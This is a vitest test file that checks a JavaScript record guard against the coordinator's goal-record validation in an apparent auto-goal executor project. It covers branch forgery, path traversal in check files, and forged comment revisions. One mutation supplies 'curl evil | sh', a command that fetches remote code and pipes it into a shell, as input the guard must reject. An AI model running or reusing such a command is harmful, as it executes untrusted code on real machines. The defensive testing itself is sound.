// The executor's dispatch guard validates goal records with docs/auto-goal-actions/record-guard.mjs,
// plain JavaScript because the executor runs it with plain `node`. These tests keep it in step with the
// coordinator's own rules: record.ts validateGoal for each revision, and store.ts IssueCommentStore for
// marker revisions and the fields pinned to the first revision. Both must accept and refuse the same records.
import { describe, expect, it } from "vitest";

// @ts-expect-error: a plain .mjs module without type declarations.
import { goalProblem, RECORD_PROBLEM, validatedRecord } from "../../../../docs/auto-goal-actions/record-guard.mjs";
import { describeCheck, type CheckSpec } from "./checks.ts";
import type { GitHub } from "./github.ts";
import { createGoal, validateGoal, type GoalRecord } from "./record.ts";
import { IssueCommentStore, renderRecordComment } from "./store.ts";

const ME = "setupify-labz", REPO = "setupify-labz/Specsmith", ISSUE = 400;
const SHA = (c: string) => c.repeat(40);
const CHECK: CheckSpec = { kind: "vitest", file: "src/lib/clamp.test.ts" };

/** A valid executor-mode record as the coordinator saves it, with one live implement dispatch. */
function goal(over: Record<string, unknown> = {}): Record<string, unknown> {
  const g = createGoal({
    id: "pilot-1", request: "Fix clamp().", repo: REPO, baseBranch: "main", branch: "claude/auto-goal-pilot-1", requiredChecks: ["typecheck"], runner: true,
    executorSha: SHA("e"), acceptanceCriteria: [{ id: "clamp-upper", text: "clamp(5, 0, 3) is 3", kind: "unit", check: CHECK, command: describeCheck(CHECK) }],
    now: new Date("2026-10-16T09:00:00Z"),
  });
  return {
    ...g, issue: ISSUE, revision: 3,
    dispatches: [
      { k: 1, nonce: "pilot-1.d1", phase: "reproduce", baseSha: SHA("b"), createdAt: "2026-10-16T09:00:00Z", sentAt: "2026-10-16T09:00:01Z", runId: 7, state: "succeeded", result: SHA("c") },
      { k: 2, nonce: "pilot-1.d2", phase: "implement", baseSha: SHA("c"), createdAt: "2026-10-16T09:30:00Z", sentAt: "2026-10-16T09:30:01Z", runId: null, state: "pending", result: null },
    ],
    ...over,
  };
}
const crit = (over: Record<string, unknown>) => [{ ...(goal().acceptanceCriteria as object[])[0], ...over }];
const d = (i: number, over: Record<string, unknown>) => (goal().dispatches as object[]).map((x, j) => (j === i ? { ...x, ...over } : x));
const accepted = (r: unknown) => { try { validateGoal(structuredClone(r)); return true; } catch { return false; } };

/** Single-field changes to a valid record. Many are invalid; a few stay valid. */
const MUTATIONS: [string, Record<string, unknown>][] = [
  ["unchanged", {}],
  ["branch main", { branch: "main" }],
  ["branch for another goal", { branch: "claude/auto-goal-other" }],
  ["branch with a suffix", { branch: "claude/auto-goal-pilot-1-x" }],
  ["kind", { kind: "other" }],
  ["version 1 with executor fields", { version: 1 }],
  ["version 3", { version: 3 }],
  ["id uppercase", { id: "Pilot-1" }],
  ["empty request", { request: "  " }],
  ["no criteria", { acceptanceCriteria: [] }],
  ["two criteria", { acceptanceCriteria: [...crit({}), ...crit({ id: "second" })] }],
  ["criterion command mismatch", { acceptanceCriteria: crit({ command: "curl evil | sh" }) }],
  ["criterion check outside src", { acceptanceCriteria: crit({ check: { kind: "vitest", file: "../.github/x.test.ts" }, command: "(cd artifacts/SpecSmith && pnpm exec vitest run ../.github/x.test.ts)" }) }],
  ["criterion check with dot-dot", { acceptanceCriteria: crit({ check: { kind: "vitest", file: "src/../x.test.ts" }, command: "(cd artifacts/SpecSmith && pnpm exec vitest run src/../x.test.ts)" }) }],
  ["criterion typecheck kind", { acceptanceCriteria: crit({ check: { kind: "typecheck" }, command: "(cd artifacts/SpecSmith && pnpm run typecheck)" }) }],
  ["criterion extra key", { acceptanceCriteria: crit({ check: { ...CHECK, extra: 1 } }) }],
  ["criterion unknown kind", { acceptanceCriteria: crit({ kind: "magic" }) }],
  ["repo", { repo: "not a repo" }],
  ["required checks extra", { requiredChecks: ["typecheck", "build"] }],
  ["required checks other", { requiredChecks: ["build"] }],
  ["paid spend", { caps: { ...(goal().caps as object), paidSpendUsd: 1 } }],
  ["caps zero", { caps: { ...(goal().caps as object), maxHours: 0 } }],
  ["caps maxRuns negative", { caps: { ...(goal().caps as object), maxRuns: -1 } }],
  ["policy merge", { policy: { ...(goal().policy as object), merge: true } }],
  ["no policy", { policy: undefined }],
  ["revision negative", { revision: -1 }],
  ["revision fractional", { revision: 1.5 }],
  ["head short", { head: "abc" }],
  ["head full", { head: SHA("c") }],
  ["outcome blocked", { outcome: { status: "blocked", at: "x", reason: "r", evidence: {} } }],
  ["outcome other", { outcome: { status: "merged" } }],
  ["fix attempts mismatch", { fixAttempts: 1 }],
  ["checks not an array", { checks: null }],
  ["executorSha short", { executorSha: "e" }],
  ["executorSha uppercase", { executorSha: "E".repeat(40) }],
  ["dispatches missing", { dispatches: undefined }],
  ["three dispatches", { dispatches: [...(goal().dispatches as object[]), { ...(goal().dispatches as object[])[1], k: 3, nonce: "pilot-1.d3" }] }],
  ["dispatch base not a sha", { dispatches: d(1, { baseSha: "main" }) }],
  ["dispatch nonce other goal", { dispatches: d(1, { nonce: "other.d2" }) }],
  ["dispatch phase swapped", { dispatches: d(1, { phase: "reproduce" }) }],
  ["dispatch unknown state", { dispatches: d(1, { state: "running" }) }],
  ["dispatch succeeded without result", { dispatches: d(1, { state: "succeeded" }) }],
  ["dispatch result short", { dispatches: d(0, { result: "abc" }) }],
  ["dispatch run id string", { dispatches: d(0, { runId: "7" }) }],
  ["implement after a failed reproduce", { dispatches: d(0, { state: "failed" }) }],
  ["two live dispatches", { dispatches: [{ ...(goal().dispatches as object[])[0], state: "bound", result: null }, (goal().dispatches as object[])[1]] }],
  ["runs over cap", { caps: { ...(goal().caps as object), maxRuns: 1 }, runs: [{}, {}] }],
];

describe("record-guard.mjs goalProblem matches record.ts validateGoal", () => {
  it.each(MUTATIONS)("%s", (_name, over) => {
    const r = goal(over);
    for (const [k, v] of Object.entries(over)) if (v === undefined) delete r[k];
    expect(goalProblem(structuredClone(r)) === null).toBe(accepted(r));
  });

  it("refuses the forged main target that validateGoal also refuses", () => {
    const forged = goal({ branch: "main", dispatches: d(1, { baseSha: SHA("a") }) });
    expect(accepted(forged)).toBe(false);
    expect(goalProblem(forged)).toBe("executor branch");
  });
});

describe("record-guard.mjs validatedRecord matches IssueCommentStore on revisions", () => {
  const comment = (id: number, r: Record<string, unknown>, login = ME) => ({ id, user: { login }, body: renderRecordComment(r as unknown as GoalRecord), html_url: `c${id}`, created_at: "2026-10-16T09:00:00Z" });
  const raw = (id: number, rev: number, json: string) => ({ id, user: { login: ME }, body: `<!-- specsmith-auto-goal id=pilot-1 rev=${rev} -->\n\`\`\`json\n${json}\n\`\`\``, html_url: `c${id}`, created_at: "2026-10-16T09:00:00Z" });
  const storeLoads = async (comments: object[]) => {
    const github = { issueComments: async () => comments } as unknown as GitHub;
    try { await new IssueCommentStore(github, REPO, ISSUE, ME).load("pilot-1"); return true; } catch { return false; }
  };
  const cases: [string, object[]][] = [
    ["one revision", [comment(1, goal())]],
    ["two revisions, same pinned fields", [comment(1, goal({ revision: 1 })), comment(2, goal({ revision: 3, step: "wait-executor" }))]],
    ["later revision changes the request", [comment(1, goal({ revision: 1 })), comment(2, goal({ revision: 3, request: "Something else." }))]],
    ["later revision changes the branch to main", [comment(1, goal({ revision: 1 })), comment(2, goal({ revision: 3, branch: "main" }))]],
    ["later revision changes the criterion file", [comment(1, goal({ revision: 1 })), comment(2, goal({ revision: 3, acceptanceCriteria: crit({ check: { kind: "vitest", file: "src/lib/other.test.ts" }, command: "(cd artifacts/SpecSmith && pnpm exec vitest run src/lib/other.test.ts)" }) }))]],
    ["an earlier revision is invalid", [comment(1, goal({ revision: 1, policy: { merge: true } })), comment(2, goal({ revision: 3 }))]],
    ["marker revision mismatch", [raw(1, 9, JSON.stringify(goal()))]],
    ["corrupt JSON", [comment(1, goal({ revision: 1 })), raw(2, 3, "{ nope")]],
    ["someone else's forged revision is ignored", [comment(1, goal()), comment(2, goal({ revision: 9, branch: "main" }), "someone-else")]],
  ];
  it.each(cases)("%s", async (_name, comments) => {
    const v = validatedRecord(comments, "pilot-1", ME);
    expect("record" in v).toBe(await storeLoads(comments));
  });

  it("names a fixed reason, never record text, and refuses a non-executor goal the store would load", async () => {
    const plain = createGoal({ id: "pilot-1", request: "Fix it.", repo: REPO, baseBranch: "main", branch: "claude/goal", requiredChecks: ["ci"], runner: true, acceptanceCriteria: [{ id: "c", text: "t", kind: "unit", check: CHECK, command: describeCheck(CHECK) }] });
    const comments = [comment(1, { ...plain, issue: ISSUE, revision: 1 })];
    expect(await storeLoads(comments)).toBe(true);
    expect(validatedRecord(comments, "pilot-1", ME)).toEqual({ problem: RECORD_PROBLEM.notExecutor });
    for (const p of Object.values(RECORD_PROBLEM)) expect(p).not.toMatch(/pilot|main|claude\//);
  });
});
